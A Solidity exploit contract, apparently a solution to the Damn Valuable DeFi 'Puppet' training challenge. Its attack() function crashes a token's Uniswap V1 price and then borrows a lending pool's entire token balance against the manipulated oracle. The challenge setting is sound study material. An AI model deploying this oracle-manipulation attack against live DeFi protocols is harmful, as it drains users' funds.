// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";

contract ExploitHelper {
    DamnValuableToken public token;
    IUniswapV1Exchange public uniswap;
    PuppetPool public lendingPool;
    address public recovery;

    constructor(
        address _token,
        address _uniswap,
        address _lendingPool,
        address _recovery
    ) {
        token = DamnValuableToken(_token);
        uniswap = IUniswapV1Exchange(_uniswap);
        lendingPool = PuppetPool(_lendingPool);
        recovery = _recovery;
    }

    function attack() external payable {
        uint256 playerBalance = token.balanceOf(address(this));
        token.approve(address(uniswap), playerBalance);

        // Swap all tokens for ETH, drastically lowering the token's price on Uniswap
        uniswap.tokenToEthSwapInput(
            playerBalance,
            1 ether,
            block.timestamp + 1
        );

        // Compute the now-reduced ETH collateral required to borrow all pool tokens
        uint256 amountToBorrow = token.balanceOf(address(lendingPool));
        uint256 requiredCollateral = lendingPool.calculateDepositRequired(amountToBorrow);

        lendingPool.borrow{value: requiredCollateral}(amountToBorrow, recovery);
    }

    receive() external payable {}
}
